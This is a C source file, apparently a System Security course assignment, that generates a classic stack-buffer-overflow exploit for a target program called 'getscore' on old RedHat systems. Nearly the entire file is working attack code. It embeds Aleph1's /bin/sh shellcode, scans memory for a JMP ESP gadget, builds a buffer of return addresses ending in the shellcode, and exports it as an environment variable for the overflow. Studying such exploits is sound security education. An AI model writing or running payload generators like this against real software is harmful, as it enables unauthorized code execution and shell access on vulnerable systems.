#include <stdlib.h>
/* Author: Yasanka Sameera Horwalavithana
 System Security | Assignment 01
 Smash Stack Attack 
 with indirect jump to ESP
 works for both RedHat 8 and 9;
  Run: ./exploit_gen_with_jmp_esp <ldd entry address> <EGG Size>
 E.g., ./exploit_gen_with_jmp_esp 0x42000000 190
 ./getscore "ABC" $EGG
 */

#define NOP 0x90
/*
 Aleph1's Linux shellcode
 from "Smashing the stack for fun and profit",
 Phrack 49, vol 7
 */
char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

void setNOP(char *start, int size){
    char *p = start;
    int i=0;
    while(i<size){
        *p=NOP;
        p+=1;
        i+=1;
    }
    printf("[set] NOP adds.\n");
}

void setRET(char *start, int size, long address){
    long *p = (long *) start;
    int i=0;
    while(i<size){
        *p=address;
        p+=1;
        i+=4;
    }
    printf("[set] RET adds.\n");
    
}

void setShellCode(char *start, int size){
    char *p = start;
    int i=0;
    while(i<size){
        *p=shellcode[i];
        p+=1;
        i+=1;
    }
    printf("[set] shell code.\n");
    
}


void main(int argc, char *argv[]) {
    char *egg, *_p;
    unsigned long *p, lddaddress, eipaddress;
    int i, eggsize, nopsled;
    
    if (argc > 2){
        /* Take the ldd entry address to search JMP ESP */
        lddaddress  = strtoll(argv[1], NULL, 0);
        printf("Using search address: 0x%x\n", lddaddress);
        
        /* Take the minimum size for the buffer to place the shell code */
        eggsize  = atoi(argv[2]);
        printf("Using EGG size: %d\n", eggsize);
    }
    
    /* Allocate memory for the buffer to place shell code */
    if (!(egg = malloc(eggsize))) {
        printf("[Error] Memory Allocation Failed.\n");
        exit(0);
    }
    
    int shellcode_size=sizeof(shellcode);
    printf("Length of shell code: %d\n", shellcode_size);
    
    /* Searching for JMP ESP starting with ldd entry address */
    printf("Searching JMP ESP...wait...\n");
    _p = (unsigned char *) lddaddress;
    i=0;
    while(1){
        /*printf("Searching JMP...value: [%ld, 0x%x], address: [%ld, 0x%x]\n",_p[i],_p[i],_p+i,_p+i);*/
        if(_p[i]==0xffffffff && _p[i+1]==0xffffffe4){
            break;
        }
        i++;
    }
    
    printf("JMP ESP value: [%ld, 0x%x], address: [%ld, 0x%x]\n",_p[i],_p[i],_p+i,_p+i);
    
    eipaddress=_p+i;
    printf("Using address: 0x%x\n", eipaddress);
    
    /*nopsled=eggsize/2;
     printf("NOP sled: %d bytes\n",nopsled);*/
    
    /*_p = egg;
    p = (long *) _p;
    for (i = 0; i < eggsize; i+=4)
        *(p++) = eipaddress;*/
    
    /*for (i = 0; i < nopsled; i++)
     egg[i]=NOP;*/
    
    /*_p = egg + eggsize - strlen(shellcode) - 1;
    for (i = 0; i < strlen(shellcode); i++)
        *(_p++) = shellcode[i];*/
    
    /* Assign the return address */
    setRET(egg,eggsize,eipaddress);
    
    /* Assign the NOP at the begining of buffer */
    /* setNOP(egg,nopsled); */
    
    /* Assign the return address after NOP */
    setShellCode(egg + eggsize - strlen(shellcode) - 1,strlen(shellcode));
    
    egg[eggsize - 1] = '\0';
    
    memcpy(egg,"EGG=",4);
    putenv(egg);
    system("/bin/bash");
}
